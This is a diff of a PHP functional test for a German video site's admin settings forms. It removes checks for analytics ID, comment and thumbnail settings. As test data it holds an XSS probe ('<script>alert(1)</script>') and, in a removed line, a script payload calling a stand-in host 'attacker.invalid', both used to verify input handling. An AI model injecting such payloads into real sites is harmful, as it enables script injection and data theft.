@@ -83,7 +83,6 @@ final class AdminGeneralSettingsTest extends WebTestCase
                 'maintenance_message' => SiteSettings::DEFAULT_MAINTENANCE_MESSAGE,
                 'cookie_consent_enabled' => '0',
                 'cookie_consent_message' => SiteSettings::DEFAULT_COOKIE_CONSENT_MESSAGE,
-                'google_analytics_measurement_id' => 'G-ABC1234567',
             ]);
             self::assertResponseRedirects('/admin/settings/general');
 
@@ -132,11 +131,6 @@ final class AdminGeneralSettingsTest extends WebTestCase
             self::assertSame('<script>alert(1)</script>', $settings->current()->getSeoDescription());
             self::assertFalse($settings->current()->isSearchIndexingEnabled());
             self::assertFalse($settings->current()->isCookieConsentEnabled());
-            self::assertSame('G-ABC1234567', $settings->current()->getGoogleAnalyticsMeasurementId());
-            $client->request('GET', '/admin/settings/general');
-            self::assertResponseIsSuccessful();
-            self::assertSelectorExists('input[name="google_analytics_measurement_id"][value="G-ABC1234567"]');
-            self::assertSelectorNotExists('script[data-measurement-id="G-ABC1234567"]');
 
             $entityManager = $client->getContainer()->get(EntityManagerInterface::class);
             self::assertInstanceOf(EntityManagerInterface::class, $entityManager);
@@ -160,7 +154,6 @@ final class AdminGeneralSettingsTest extends WebTestCase
                 'maintenance_message' => SiteSettings::DEFAULT_MAINTENANCE_MESSAGE,
                 'cookie_consent_enabled' => '1',
                 'cookie_consent_message' => SiteSettings::DEFAULT_COOKIE_CONSENT_MESSAGE,
-                'google_analytics_measurement_id' => '',
             ]);
             self::assertResponseRedirects('/admin/settings/general');
             $client->request('GET', '/');
@@ -197,21 +190,6 @@ final class AdminGeneralSettingsTest extends WebTestCase
             $token = (string) $client->getCrawler()->filter('form input[name="token"]')->attr('value');
             $client->request('POST', '/admin/settings/general', [
                 'token' => $token,
-                'google_analytics_measurement_id' => 'G-ABC1234567-extra',
-                'site_name' => 'Must remain unchanged',
-            ]);
-
-            self::assertResponseStatusCodeSame(Response::HTTP_UNPROCESSABLE_ENTITY);
-            self::assertSelectorTextContains('body', 'gültige GA4-Mess-ID');
-            self::assertSelectorExists('input[name="google_analytics_measurement_id"][value=""]');
-            self::assertSame('', $settings->current()->getGoogleAnalyticsMeasurementId());
-            self::assertSame($originalName, $settings->current()->getSiteName());
-
-            $client->request('GET', '/admin/settings/general');
-            self::assertResponseIsSuccessful();
-            $token = (string) $client->getCrawler()->filter('form input[name="token"]')->attr('value');
-            $client->request('POST', '/admin/settings/general', [
-                'token' => $token,
                 'site_name' => 'Should not be saved',
                 'tagline' => '',
                 'locale' => 'de',
@@ -222,7 +200,7 @@ final class AdminGeneralSettingsTest extends WebTestCase
                 'maintenance_message' => SiteSettings::DEFAULT_MAINTENANCE_MESSAGE,
                 'cookie_consent_enabled' => '1',
                 'cookie_consent_message' => SiteSettings::DEFAULT_COOKIE_CONSENT_MESSAGE,
-                'htmlcode' => '<script>fetch("https://attacker.invalid")</script>',
+                'unknown_future_setting' => '1',
             ]);
 
             self::assertResponseStatusCodeSame(Response::HTTP_UNPROCESSABLE_ENTITY);
@@ -338,14 +316,12 @@ final class AdminGeneralSettingsTest extends WebTestCase
                 'video_player_embed_max_width' => 'fluid',
                 'video_player_home_max_width' => 'fluid',
                 'player_featured_autoplay_enabled' => '0',
-                'auto_feature_view_threshold' => '0',
                 'video_player_color_scheme' => 'midnight',
                 'video_player_watermark_enabled' => '0',
                 'public_video_embedding_enabled' => '1',
                 'player_autoplay_enabled' => '0',
                 'player_autoplay_muted' => '1',
                 'default_comments_enabled' => '1',
-                'guest_comments_enabled' => '1',
                 'public_video_submissions_enabled' => '1',
             ]));
             $this->persistUser($client, $email, 'ContentSettings!2026', [AdminRole::Administrator->value]);
@@ -358,11 +334,6 @@ final class AdminGeneralSettingsTest extends WebTestCase
             self::assertSame('noindex, nofollow', $client->getResponse()->headers->get('X-Robots-Tag'));
             self::assertSelectorExists('form[action="/admin/settings/content"]');
             self::assertSelectorExists('select[name="video_player_engine"] option[value="native"][selected]');
-            self::assertSelectorExists('select[name="comment_default_sort"] option[value="added"][selected]');
-            self::assertSelectorExists('input[name="comment_rating_hide_threshold"][value="0"]');
-            self::assertSelectorExists('input[name="comments_per_page"][value="10"]');
-            self::assertSelectorExists('input[name="auto_feature_view_threshold"][type="number"][min="0"][max="2147483647"][value="0"]');
-            self::assertSelectorExists('select[name="provider_thumbnail_resolution"] option[value="medium"][selected]');
             self::assertSelectorExists('select[name="video_preload_mode"] option[value="metadata"][selected]');
             self::assertSelectorExists('select[name="video_player_aspect_ratio"] option[value="16:9"][selected]');
             self::assertSelectorExists('select[name="video_player_max_width"] option[value="fluid"][selected]');
@@ -382,39 +353,25 @@ final class AdminGeneralSettingsTest extends WebTestCase
             $client->request('POST', '/admin/settings/content', [
                 'token' => $token,
                 'video_player_engine' => 'videojs',
-                'provider_thumbnail_resolution' => 'not-a-resolution',
                 'video_player_embed_max_width' => '777',
                 'video_player_home_max_width' => '777',
                 'player_autoplay_enabled' => '1',
                 'player_autoplay_muted' => '0',
                 'default_comments_enabled' => '0',
-                'guest_comments_enabled' => '0',
-                'comment_default_sort' => 'unsupported',
-                'comment_rating_hide_threshold' => '1001',
-                'comments_per_page' => '101',
-                'auto_feature_view_threshold' => '2147483648',
                 'public_video_submissions_enabled' => '0',
             ]);
             self::assertResponseStatusCodeSame(Response::HTTP_UNPROCESSABLE_ENTITY);
             self::assertSelectorTextContains('body', 'nur mit stummgeschaltetem Player');
             self::assertSelectorTextContains('body', 'maximale Breite für Einbettungen');
             self::assertSelectorTextContains('body', 'maximale Breite für die Startseitenwiedergabe');
-            self::assertSelectorTextContains('body', 'Vorschaubild-Auflösung');
-            self::assertSelectorTextContains('body', 'unterstützte Kommentarsortierung');
-            self::assertSelectorTextContains('body', 'Schwelle muss eine ganze Zahl von 0 bis 1000 sein');
-            self::assertSelectorTextContains('body', 'Zahl der Kommentare pro Seite muss zwischen 1 und 100 liegen');
-            self::assertSelectorTextContains('body', 'Schwelle für die automatische Hervorhebung muss eine ganze Zahl von 0 bis 2147483647 sein');
-            self::assertSelectorExists('input[name="auto_feature_view_threshold"][value="2147483648"]');
             self::assertSame('false', $entityManager->getConnection()->fetchOne('SELECT player_autoplay_enabled::text FROM site_settings WHERE id = 1'));
             self::assertSame('fluid', $entityManager->getConnection()->fetchOne('SELECT video_player_embed_max_width FROM site_settings WHERE id = 1'));
             self::assertSame('fluid', $entityManager->getConnection()->fetchOne('SELECT video_player_home_max_width FROM site_settings WHERE id = 1'));
             self::assertSame('false', $entityManager->getConnection()->fetchOne('SELECT player_featured_autoplay_enabled::text FROM site_settings WHERE id = 1'));
-            self::assertSame('0', $entityManager->getConnection()->fetchOne('SELECT auto_feature_view_threshold::text FROM site_settings WHERE id = 1'));
 
             $client->request('POST', '/admin/settings/content', [
                 'token' => $token,
                 'video_player_engine' => 'videojs',
-                'provider_thumbnail_resolution' => 'large',
                 'video_preload_mode' => 'auto',
                 'video_player_aspect_ratio' => '4:3',
                 'video_player_max_width' => '800',
@@ -426,31 +383,20 @@ final class AdminGeneralSettingsTest extends WebTestCase
                 'player_autoplay_enabled' => '1',
                 'player_autoplay_muted' => '1',
                 'player_featured_autoplay_enabled' => '1',
-                'auto_feature_view_threshold' => '2',
                 'default_comments_enabled' => '0',
-                'guest_comments_enabled' => '0',
-                'comment_default_sort' => 'score',
-                'comment_rating_hide_threshold' => '3',
-                'comments_per_page' => '2',
                 'public_video_submissions_enabled' => '0',
             ]);
             self::assertResponseRedirects('/admin/settings/content');
             self::assertSame('videojs', $entityManager->getConnection()->fetchOne('SELECT video_player_engine FROM site_settings WHERE id = 1'));
-            self::assertSame('large', $entityManager->getConnection()->fetchOne('SELECT provider_thumbnail_resolution FROM site_settings WHERE id = 1'));
             self::assertSame('auto', $entityManager->getConnection()->fetchOne('SELECT video_preload_mode FROM site_settings WHERE id = 1'));
             self::assertSame('4:3', $entityManager->getConnection()->fetchOne('SELECT video_player_aspect_ratio FROM site_settings WHERE id = 1'));
             self::assertSame('800', $entityManager->getConnection()->fetchOne('SELECT video_player_max_width FROM site_settings WHERE id = 1'));
             self::assertSame('1024', $entityManager->getConnection()->fetchOne('SELECT video_player_embed_max_width FROM site_settings WHERE id = 1'));
             self::assertSame('800', $entityManager->getConnection()->fetchOne('SELECT video_player_home_max_width FROM site_settings WHERE id = 1'));
             self::assertSame('true', $entityManager->getConnection()->fetchOne('SELECT player_featured_autoplay_enabled::text FROM site_settings WHERE id = 1'));
-            self::assertSame('2', $entityManager->getConnection()->fetchOne('SELECT auto_feature_view_threshold::text FROM site_settings WHERE id = 1'));
             self::assertSame('ocean', $entityManager->getConnection()->fetchOne('SELECT video_player_color_scheme FROM site_settings WHERE id = 1'));
             self::assertSame('true', $entityManager->getConnection()->fetchOne('SELECT video_player_watermark_enabled::text FROM site_settings WHERE id = 1'));
             self::assertSame('false', $entityManager->getConnection()->fetchOne('SELECT public_video_embedding_enabled::text FROM site_settings WHERE id = 1'));
-            self::assertSame('false', $entityManager->getConnection()->fetchOne('SELECT guest_comments_enabled::text FROM site_settings WHERE id = 1'));
-            self::assertSame('score', $entityManager->getConnection()->fetchOne('SELECT comment_default_sort FROM site_settings WHERE id = 1'));
-            self::assertSame('3', $entityManager->getConnection()->fetchOne('SELECT comment_rating_hide_threshold::text FROM site_settings WHERE id = 1'));
-            self::assertSame('2', $entityManager->getConnection()->fetchOne('SELECT comments_per_page::text FROM site_settings WHERE id = 1'));
             self::assertNotFalse($entityManager->getConnection()->fetchOne(
                 "SELECT id FROM admin_activity_entries WHERE route_name = 'admin_content_settings_update' LIMIT 1",
             ));
@@ -460,20 +406,11 @@ final class AdminGeneralSettingsTest extends WebTestCase
             self::assertSelectorExists('form[action="/admin/settings/content"] input[type="hidden"][name="video_player_embed_max_width"][value="1024"]');
             self::assertSelectorExists('form[action="/admin/settings/content"] input[type="hidden"][name="video_player_home_max_width"][value="800"]');
             self::assertSelectorExists('form[action="/admin/settings/content"] input[type="hidden"][name="player_featured_autoplay_enabled"][value="1"]');
-            self::assertSelectorExists('form[action="/admin/settings/content"] input[type="hidden"][name="auto_feature_view_threshold"][value="2"]');
-            self::assertSelectorExists('form[action="/admin/settings/content"] input[type="hidden"][name="provider_thumbnail_resolution"][value="large"]');
-            self::assertSelectorExists('form[action="/admin/settings/content"] input[type="hidden"][name="guest_comments_enabled"][value="0"]');
-            self::assertSelectorExists('form[action="/admin/settings/content"] select[name="comment_default_sort"] option[value="score"][selected]');
-            self::assertSelectorExists('form[action="/admin/settings/content"] input[name="comment_rating_hide_threshold"][value="3"]');
-            self::assertSelectorExists('form[action="/admin/settings/content"] input[name="comments_per_page"][value="2"]');
             $client->submitForm('Inhaltseinstellungen speichern');
             self::assertResponseRedirects('/admin/settings/content');
             self::assertSame('1024', $entityManager->getConnection()->fetchOne('SELECT video_player_embed_max_width FROM site_settings WHERE id = 1'));
             self::assertSame('800', $entityManager->getConnection()->fetchOne('SELECT video_player_home_max_width FROM site_settings WHERE id = 1'));
             self::assertSame('true', $entityManager->getConnection()->fetchOne('SELECT player_featured_autoplay_enabled::text FROM site_settings WHERE id = 1'));
-            self::assertSame('2', $entityManager->getConnection()->fetchOne('SELECT auto_feature_view_threshold::text FROM site_settings WHERE id = 1'));
-            self::assertSame('large', $entityManager->getConnection()->fetchOne('SELECT provider_thumbnail_resolution FROM site_settings WHERE id = 1'));
-            self::assertSame('false', $entityManager->getConnection()->fetchOne('SELECT guest_comments_enabled::text FROM site_settings WHERE id = 1'));
 
             $client->request('GET', '/admin/news/new');
             self::assertResponseIsSuccessful();
@@ -1089,9 +1026,6 @@ final class AdminGeneralSettingsTest extends WebTestCase
             self::assertFalse($availability->isEnabled('news'));
             self::assertTrue($availability->isEnabled('admin'));
             self::assertTrue($availability->controllerIsEnabled('App\\Module\\Automation\\Controller\\AdminScheduledTaskController::index'));
-            self::assertTrue($availability->controllerIsEnabled('App\\Module\\Content\\Controller\\AdminContentInlineImageController::upload'));
-            self::assertTrue($availability->controllerIsEnabled('App\\Module\\Content\\Controller\\ContentInlineImageController::show'));
-            self::assertFalse($availability->controllerIsEnabled('App\\Module\\Content\\Controller\\UnknownController::index'));
             self::assertFalse($availability->controllerIsEnabled('App\\Module\\News\\Controller\\NewsPublicController::index'));
             self::assertFalse($availability->controllerIsEnabled('App\\Module\\Future\\Controller\\UnknownController::index'));
 
@@ -1144,10 +1078,9 @@ final class AdminGeneralSettingsTest extends WebTestCase
             },
         );
         $storage->expects(self::exactly(2))->method('read')->willReturnCallback(
-            static function (string $requestedId, int $maximumBytes) use (&$objectId, &$objectContents, $contents): string {
+            static function (string $requestedId) use (&$objectId, &$objectContents): string {
                 self::assertSame($objectId, $requestedId);
                 self::assertIsString($objectContents);
-                self::assertSame(strlen($contents), $maximumBytes);
 
                 return $objectContents;
             },
@@ -1260,15 +1193,7 @@ final class AdminGeneralSettingsTest extends WebTestCase
             self::assertStringContainsString('private', (string) $client->getResponse()->headers->get('Cache-Control'));
             self::assertStringContainsString('no-store', (string) $client->getResponse()->headers->get('Cache-Control'));
             self::assertSame('noindex, nofollow', $client->getResponse()->headers->get('X-Robots-Tag'));
-            $shareSettingsForm = $client->getCrawler()->filterXPath(
-                '//form[.//input[@type="checkbox" and @name="video_share_widget_enabled"]]',
-            );
-            self::assertCount(1, $shareSettingsForm);
-            self::assertStringContainsString(
-                'Teilen-Bereich für Videos, News und Serienfolgen anzeigen',
-                $shareSettingsForm->text(),
-            );
-            $token = (string) $shareSettingsForm->filter('input[name="token"]')->attr('value');
+            $token = (string) $client->getCrawler()->filter('form input[name="token"]')->attr('value');
             self::assertNotSame('', $token);
 
             $client->request('POST', '/admin/settings/public-display', [
@@ -1390,7 +1315,7 @@ final class AdminGeneralSettingsTest extends WebTestCase
 
         $connection = $entityManager->getConnection();
         $connection->executeStatement(
-            "UPDATE site_settings SET site_name = 'Arcanorum', tagline = '', default_locale = 'de', timezone = 'Europe/Berlin', seo_description = '', search_indexing_enabled = TRUE, maintenance_mode_enabled = FALSE, maintenance_message = 'Die Website wird gewartet. Bitte versuchen Sie es später erneut.', cookie_consent_enabled = TRUE, cookie_consent_message = 'Wir verwenden notwendige Cookies für Anmeldung, Sicherheit und die Ansichtspräferenz in diesem Browser. Optionale Analyse- und Werbedienste werden nur nach Ihrer Zustimmung geladen.', google_analytics_measurement_id = '', module_news_enabled = TRUE, module_series_enabled = TRUE, module_comments_enabled = TRUE, module_contact_enabled = TRUE, module_pages_enabled = TRUE, module_search_enabled = TRUE, video_player_engine = 'native', provider_thumbnail_resolution = 'medium', video_preload_mode = 'metadata', video_player_aspect_ratio = '16:9', video_player_max_width = 'fluid', video_player_embed_max_width = 'fluid', video_player_home_max_width = 'fluid', player_featured_autoplay_enabled = FALSE, auto_feature_view_threshold = 0, video_player_color_scheme = 'midnight', video_player_watermark_enabled = FALSE, video_player_watermark_object_id = NULL, video_player_watermark_mime_type = NULL, video_player_watermark_size = NULL, video_player_watermark_sha256 = NULL, public_video_embedding_enabled = TRUE, player_autoplay_enabled = FALSE, player_autoplay_muted = TRUE, default_comments_enabled = TRUE, guest_comments_enabled = TRUE, comment_default_sort = 'added', comment_rating_hide_threshold = 0, comments_per_page = 10, public_video_submissions_enabled = TRUE, homepage_featured_limit = 1, homepage_video_limit = 6, homepage_news_limit = 6, public_video_page_limit = 24, popular_video_sort = 'views', popular_video_period_days = 30, currently_watching_limit = 0, public_statistics_enabled = FALSE, tag_cloud_enabled = FALSE, tag_cloud_limit = 20, tag_cloud_shuffle = FALSE, related_video_limit = 6, top_rated_video_limit = 0, video_share_widget_enabled = TRUE, member_registration_enabled = TRUE, social_google_enabled = FALSE, social_facebook_enabled = FALSE, social_twitter_enabled = FALSE, comment_provider = 'native', facebook_comments_app_id = '', disqus_comments_shortname = '' WHERE id = 1",
+            "UPDATE site_settings SET site_name = 'Arcanorum', tagline = '', default_locale = 'de', timezone = 'Europe/Berlin', seo_description = '', search_indexing_enabled = TRUE, maintenance_mode_enabled = FALSE, maintenance_message = 'Die Website wird gewartet. Bitte versuchen Sie es später erneut.', cookie_consent_enabled = TRUE, cookie_consent_message = 'Wir verwenden notwendige Cookies für Anmeldung und Sicherheit. Derzeit setzen wir keine Analyse- oder Werbecookies.', module_news_enabled = TRUE, module_series_enabled = TRUE, module_comments_enabled = TRUE, module_contact_enabled = TRUE, module_pages_enabled = TRUE, module_search_enabled = TRUE, video_player_engine = 'native', video_preload_mode = 'metadata', video_player_aspect_ratio = '16:9', video_player_max_width = 'fluid', video_player_embed_max_width = 'fluid', video_player_home_max_width = 'fluid', player_featured_autoplay_enabled = FALSE, video_player_color_scheme = 'midnight', video_player_watermark_enabled = FALSE, video_player_watermark_object_id = NULL, video_player_watermark_mime_type = NULL, video_player_watermark_size = NULL, video_player_watermark_sha256 = NULL, public_video_embedding_enabled = TRUE, player_autoplay_enabled = FALSE, player_autoplay_muted = TRUE, default_comments_enabled = TRUE, public_video_submissions_enabled = TRUE, homepage_featured_limit = 1, homepage_video_limit = 6, homepage_news_limit = 6, public_video_page_limit = 24, popular_video_sort = 'views', popular_video_period_days = 30, currently_watching_limit = 0, public_statistics_enabled = FALSE, tag_cloud_enabled = FALSE, tag_cloud_limit = 20, tag_cloud_shuffle = FALSE, related_video_limit = 6, top_rated_video_limit = 0, video_share_widget_enabled = TRUE, member_registration_enabled = TRUE, social_google_enabled = FALSE, social_facebook_enabled = FALSE, social_twitter_enabled = FALSE, comment_provider = 'native', facebook_comments_app_id = '', disqus_comments_shortname = '' WHERE id = 1",
         );
         $user = $entityManager->getRepository(AdminUser::class)->findOneBy(['email' => $email]);
         if ($user instanceof AdminUser) {
